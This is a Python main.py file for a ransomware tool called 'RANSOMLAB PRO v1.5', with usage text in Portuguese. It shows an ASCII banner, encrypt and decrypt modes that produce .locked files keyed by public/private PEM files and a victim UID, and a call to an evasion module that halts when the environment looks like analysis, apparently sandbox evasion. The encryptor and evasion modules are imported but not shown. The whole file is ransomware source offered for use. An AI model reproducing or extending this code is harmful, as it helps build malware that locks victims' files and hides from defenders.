# main.py

import sys
import os
from evasion.evasion_controller import run_evasion_scan
from core.encryptor import encrypt_file
from core.decryptor import decrypt_file
from builder.config import DEFAULT_EXTENSIONS

BANNER = r"""
██████╗  █████╗ ███╗   ███╗███████╗ ███╗   ██╗███████╗██╗      █████╗ ██████╗ 
██╔══██╗██╔══██╗████╗ ████║██╔════╝ ████╗  ██║██╔════╝██║     ██╔══██╗██╔══██╗
██████╔╝███████║██╔████╔██║█████╗   ██╔██╗ ██║█████╗  ██║     ███████║██████╔╝
██╔═══╝ ██╔══██║██║╚██╔╝██║██╔══╝   ██║╚██╗██║██╔══╝  ██║     ██╔══██║██╔═══╝ 
██║     ██║  ██║██║ ╚═╝ ██║███████╗ ██║ ╚████║███████╗███████╗██║  ██║██║     
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
                                [ RANSOMLAB PRO v1.5 ]
"""

def show_usage():
    print(BANNER)
    print("Modo de Uso:")
    print("  🔐 Criptografar: python main.py encrypt <file_path> <public.pem> <UID>")
    print("  🔓 Descriptografar: python main.py decrypt <file.locked> <private.pem> <UID>\n")
    print("  [⚙️] Todos os arquivos .locked geram log automático em /output\n")

def main():
    if len(sys.argv) < 5:
        show_usage()
        return

    operation = sys.argv[1].lower()
    file_path = sys.argv[2]
    key_path = sys.argv[3]
    uid = sys.argv[4]

    print(BANNER)
    print(f"[📂] Operação: {operation.upper()} — Target: {file_path}\n")

    # ⛔ Evasão de ambientes
    if not run_evasion_scan():
        print("[💀] Ambiente inseguro. Encerrando execução.")
        return

    # 🔐 Encrypt
    if operation == "encrypt":
        if not os.path.isfile(file_path):
            print(f"[❌] Arquivo não encontrado: {file_path}")
            return
        encrypt_file(file_path, key_path, uid)

    # 🔓 Decrypt
    elif operation == "decrypt":
        if not os.path.isfile(file_path):
            print(f"[❌] Arquivo não encontrado: {file_path}")
            return
        decrypt_file(file_path, key_path, uid)

    else:
        print("[❌] Comando inválido.")
        show_usage()

if __name__ == "__main__":
    main()
